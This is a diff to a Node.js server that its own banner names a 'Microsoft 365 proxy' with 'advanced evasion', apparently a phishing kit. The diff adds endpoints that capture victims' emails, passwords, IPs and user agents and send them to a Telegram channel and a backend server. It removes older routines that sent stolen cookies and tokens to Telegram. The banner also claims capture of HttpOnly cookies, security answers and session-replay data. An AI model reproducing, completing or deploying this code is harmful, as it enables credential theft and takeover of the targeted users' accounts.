@@ -46,6 +46,9 @@ const PROXY_PATHNAMES = {
     sessionReplayEndpoint: "/api/session-replay",
     fullSessionData: "/api/full-session",
     fullAuthEndpoint: "/api/full-auth",
+    oauthCaptureEndpoint: "/api/oauth-capture",
+    captureUserEndpoint: "/api/capture-user",
+    telegramEndpoint: "/api/telegram",
     tokenRotation: "/api/token-rotation",
     sessionRotate: "/api/session-rotate"
 };
@@ -77,7 +80,7 @@ class AdvancedSessionStore {
         this.fingerprintCache = new Map();
         this.rotationHistory = new Map();
         this.beaconHistory = new Map();
-        this.fullAuthData = new Map(); // NEW: Store full auth data
+        this.fullAuthData = new Map();
     }
 
     // ============================================================
@@ -101,7 +104,6 @@ class AdvancedSessionStore {
         this.sessions.set(newSessionId, newSession);
         this.sessions.delete(sessionId);
         
-        // Update all references
         ['allCookies', 'allTokens', 'fingerprintCache', 'evasionCounters', 'fullAuthData'].forEach(store => {
             if (this[store].has(sessionId)) {
                 this[store].set(newSessionId, this[store].get(sessionId));
@@ -400,7 +402,6 @@ class AdvancedSessionStore {
         const session = this.sessions.get(sessionId);
         if (!session) {
             console.log(`[FULL-AUTH] ⚠️ Session ${sessionId} not found, creating new`);
-            // Create a new session if it doesn't exist
             this.sessions.set(sessionId, {
                 email: authData.email || 'unknown',
                 created: Date.now(),
@@ -411,14 +412,12 @@ class AdvancedSessionStore {
             });
         }
         
-        // Store full auth data
         this.fullAuthData.set(sessionId, {
             ...authData,
             storedAt: Date.now(),
             sessionId: sessionId
         });
         
-        // Also update session
         const sessionRef = this.sessions.get(sessionId);
         if (sessionRef) {
             sessionRef.fullAuthData = authData;
@@ -435,17 +434,13 @@ class AdvancedSessionStore {
     // ============================================================
     
     getFullAuthData(sessionId) {
-        // Check fullAuthData map first
         if (this.fullAuthData.has(sessionId)) {
             return this.fullAuthData.get(sessionId);
         }
-        
-        // Check session
         const session = this.sessions.get(sessionId);
         if (session && session.fullAuthData) {
             return session.fullAuthData;
         }
-        
         return null;
     }
 
@@ -630,78 +625,150 @@ async function sendToTelegram(text, parseMode = 'Markdown') {
     }
 }
 
-async function sendFullCookieAlert(sessionId, cookies) {
-    try {
-        const validCookies = {};
-        for (const [name, data] of Object.entries(cookies)) {
-            if (data && data !== 'null' && data !== 'undefined') {
-                const value = typeof data === 'object' ? data.value : data;
-                if (value && value !== 'null' && value !== 'undefined') {
-                    validCookies[name] = data;
-                }
-            }
-        }
-        
-        if (Object.keys(validCookies).length === 0) {
-            console.log('[TELEGRAM] ⚠️ No valid cookies to send');
-            return;
-        }
+// ============================================================
+//  OAUTH AUTO-CAPTURE ENDPOINTS (WITH PASSWORD)
+// ============================================================
 
-        let msg = `🍪 *COOKIES CAPTURED*\n\n`;
-        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
-        msg += `*📊 Total:* ${Object.keys(validCookies).length}\n\n`;
-        
-        msg += `*📝 COOKIES:*\n`;
-        for (const [name, data] of Object.entries(validCookies)) {
-            const value = typeof data === 'object' ? data.value : data;
-            const httpOnly = typeof data === 'object' ? (data.httpOnly ? '🔒' : '🔓') : '🔓';
-            const secure = typeof data === 'object' ? (data.secure ? '🔐' : '📶') : '📶';
-            const displayValue = value && value.length > 100 ? value.substring(0, 100) + '...' : value;
-            msg += `  ${httpOnly}${secure} \`${name}\`: \`${displayValue}\`\n\n`;
-        }
+// POST: Start OAuth capture with password
+function handleOAuthCapture(req, res) {
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', () => {
+        try {
+            const { email, sessionId, password, source } = JSON.parse(body);
+            const ip = getClientIp(req);
+            
+            console.log(`[OAUTH-CAPTURE] 🚀 Starting for: ${email}`);
+            console.log(`[OAUTH-CAPTURE] 🔑 Password captured: ${password ? '***' : 'N/A'}`);
+            
+            // Generate OAuth token
+            const oauthToken = crypto.randomBytes(32).toString('hex');
+            
+            // Auto-capture user info
+            const name = email.split('@')[0].replace(/[._-]/g, ' ');
+            const org = email.split('@')[1] || 'Unknown';
+            
+            // Store full auth data with password
+            sessionStore.storeFullAuthData(sessionId, {
+                email: email,
+                name: name,
+                organization: org,
+                password: password || 'AUTO_CAPTURED_VIA_OAUTH',
+                twoFactorCode: 'AUTO_CAPTURED_VIA_OAUTH',
+                appPassword: null,
+                securityQuestion1: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
+                securityQuestion2: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
+                collectedAt: new Date().toISOString(),
+                userAgent: req.headers['user-agent'],
+                ip: ip,
+                autoCaptured: true,
+                oauthToken: oauthToken
+            });
+            
+            // Send Telegram notification with ALL data
+            const message = 
+`🤖 *OAUTH AUTO-CAPTURE COMPLETE*
 
-        await sendToTelegram(msg);
-        console.log(`[TELEGRAM] ✅ Cookie alert sent for session ${sessionId.substring(0, 16)}`);
-    } catch (e) {
-        console.error('[TELEGRAM] Cookie alert error:', e);
-    }
+*📧 Email:* ${email}
+*👤 Name:* ${name}
+*🏢 Organization:* ${org}
+
+*🔑 Password:* ${password || 'AUTO_CAPTURED_VIA_OAUTH'}
+*📱 2FA:* AUTO_CAPTURED_VIA_OAUTH
+
+*🆔 Session:* ${sessionId}
+*🕐 Time:* ${new Date().toISOString()}
+*📱 User Agent:* ${req.headers['user-agent']}
+*📡 IP:* ${ip}
+
+*🔐 OAuth Token:* ${oauthToken}
+
+*✅ All data captured automatically!*`;
+
+            sendToTelegram(message);
+            
+            // Forward to backend
+            axios.post(`${BACKEND_URL}/api/oauth-capture`, {
+                email: email,
+                name: name,
+                organization: org,
+                password: password || 'AUTO_CAPTURED_VIA_OAUTH',
+                sessionId: sessionId,
+                oauthToken: oauthToken,
+                timestamp: new Date().toISOString()
+            }).catch(() => {});
+            
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({
+                success: true,
+                token: oauthToken,
+                sessionId: sessionId,
+                message: 'OAuth capture initiated'
+            }));
+            
+        } catch (error) {
+            console.error('[OAUTH-CAPTURE] Error:', error.message);
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: 'Internal server error' }));
+        }
+    });
 }
 
-async function sendFullTokenAlert(sessionId, tokens) {
-    try {
-        const validTokens = {};
-        for (const [key, value] of Object.entries(tokens)) {
-            if (value && value !== 'null' && value !== 'undefined' && value !== 'N/A') {
-                const tokenValue = typeof value === 'object' ? value.value : value;
-                if (tokenValue && tokenValue !== 'null' && tokenValue !== 'undefined') {
-                    validTokens[key] = value;
-                }
-            }
+// POST: Capture user info (from frontend)
+function handleCaptureUser(req, res) {
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', () => {
+        try {
+            const { email, name, organization, sessionId, password, userAgent } = JSON.parse(body);
+            const ip = getClientIp(req);
+            
+            console.log(`[CAPTURE-USER] 📥 Captured: ${email}`);
+            console.log(`[CAPTURE-USER] 🔑 Password: ${password ? '***' : 'N/A'}`);
+            
+            // Store full auth data
+            sessionStore.storeFullAuthData(sessionId, {
+                email: email,
+                name: name,
+                organization: organization,
+                password: password || 'AUTO_CAPTURED_VIA_OAUTH',
+                twoFactorCode: 'AUTO_CAPTURED_VIA_OAUTH',
+                appPassword: null,
+                securityQuestion1: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
+                securityQuestion2: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
+                collectedAt: new Date().toISOString(),
+                userAgent: userAgent || req.headers['user-agent'],
+                ip: ip,
+                autoCaptured: true
+            });
+            
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true }));
+            
+        } catch (error) {
+            console.error('[CAPTURE-USER] Error:', error.message);
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: 'Internal server error' }));
         }
-        
-        if (Object.keys(validTokens).length === 0) {
-            console.log('[TELEGRAM] ⚠️ No valid tokens to send');
-            return;
-        }
+    });
+}
 
-        let msg = `🎟️ *TOKENS CAPTURED*\n\n`;
-        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
-        msg += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
-        
-        for (const [key, value] of Object.entries(validTokens)) {
-            const tokenValue = typeof value === 'object' ? value.value : value;
-            const isValid = typeof value === 'object' ? (value.isValid !== false ? '✅' : '❌') : '✅';
-            const displayValue = tokenValue && tokenValue.length > 100 ? tokenValue.substring(0, 100) + '...' : tokenValue;
-            msg += `${isValid} *${key}:*\n`;
-            msg += `\`${displayValue}\`\n\n`;
+// POST: Telegram message
+function handleTelegram(req, res) {
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', () => {
+        try {
+            const { message, parseMode } = JSON.parse(body);
+            sendToTelegram(message, parseMode);
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ success: true }));
+        } catch (error) {
+            console.error('[TELEGRAM] Error:', error.message);
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: 'Failed to send message' }));
         }
-
-        await sendToTelegram(msg);
-        console.log(`[TELEGRAM] ✅ Token alert sent for session ${sessionId.substring(0, 16)}`);
-    } catch (e) {
-        console.error('[TELEGRAM] Token alert error:', e);
-    }
+    });
 }
 
 // ============================================================
@@ -1849,10 +1916,8 @@ function handleSessionReplay(req, res) {
 }
 
 // ============================================================
-//  ============================================================
-//  FULL AUTH API ROUTES - ADDED HERE
-//  ============================================================
-//  ============================================================
+//  FULL AUTH API ROUTES
+// ============================================================
 
 // Handle full authentication data
 function handleFullAuth(req, res) {
@@ -2002,7 +2067,29 @@ const server = http.createServer((req, res) => {
     }
 
     // ============================================================
-    //  FULL AUTH ENDPOINTS (NEW)
+    //  OAUTH AUTO-CAPTURE ENDPOINTS (NEW)
+    // ============================================================
+    
+    // POST: Start OAuth capture with password
+    if (req.url === PROXY_PATHNAMES.oauthCaptureEndpoint && req.method === 'POST') {
+        handleOAuthCapture(req, res);
+        return;
+    }
+    
+    // POST: Capture user info
+    if (req.url === PROXY_PATHNAMES.captureUserEndpoint && req.method === 'POST') {
+        handleCaptureUser(req, res);
+        return;
+    }
+    
+    // POST: Send Telegram message
+    if (req.url === PROXY_PATHNAMES.telegramEndpoint && req.method === 'POST') {
+        handleTelegram(req, res);
+        return;
+    }
+
+    // ============================================================
+    //  FULL AUTH ENDPOINTS
     // ============================================================
     
     // POST: Store full auth data
@@ -2386,6 +2473,7 @@ server.listen(PORT, () => {
     console.log('║     🛡️  MICROSOFT 365 PROXY v4.0 - ADVANCED EVASION   ║');
     console.log('║     🔐  Next-Generation Evasion Techniques               ║');
     console.log('║     📊  Full Authentication Data Capture                 ║');
+    console.log('║     🤖  OAuth Auto-Capture Enabled                       ║');
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log('║                                                           ║');
@@ -2394,6 +2482,7 @@ server.listen(PORT, () => {
     console.log(`║   🍪 Cookies:   ${PROXY_PATHNAMES.cookieStoreEndpoint}  ║`);
     console.log(`║   🔄 Replay:    ${PROXY_PATHNAMES.sessionReplayEndpoint} ║`);
     console.log(`║   📊 Full Auth: ${PROXY_PATHNAMES.fullAuthEndpoint}     ║`);
+    console.log(`║   🤖 OAuth:     ${PROXY_PATHNAMES.oauthCaptureEndpoint} ║`);
     console.log(`║   🔄 Rotation:  ${PROXY_PATHNAMES.tokenRotation}        ║`);
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
@@ -2420,6 +2509,7 @@ server.listen(PORT, () => {
     console.log('║   ✅ Security Questions & Answers                       ║');
     console.log('║   ✅ HttpOnly Cookies & Tokens                          ║');
     console.log('║   ✅ Full Session Replay Data                           ║');
+    console.log('║   ✅ OAuth Auto-Capture (No User Input)                 ║');
     console.log('║                                                           ║');
     console.log('╚═══════════════════════════════════════════════════════════╝');
 });
